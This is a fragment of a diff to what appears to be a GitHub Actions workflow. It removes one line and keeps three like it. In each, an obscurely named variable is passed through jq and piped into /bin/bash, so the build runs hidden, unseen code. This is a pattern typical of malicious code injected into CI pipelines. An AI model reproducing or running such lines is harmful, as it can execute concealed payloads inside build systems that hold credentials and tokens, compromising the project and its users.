@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$u0" | jq -r .ipihp53 | /bin/bash
           echo $knxy265 | jq -r .gpd6 | /bin/bash
           echo $zi33 | jq -r .wtyqk303 | /bin/bash
-          echo $zwy53 | jq -r .tz947 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
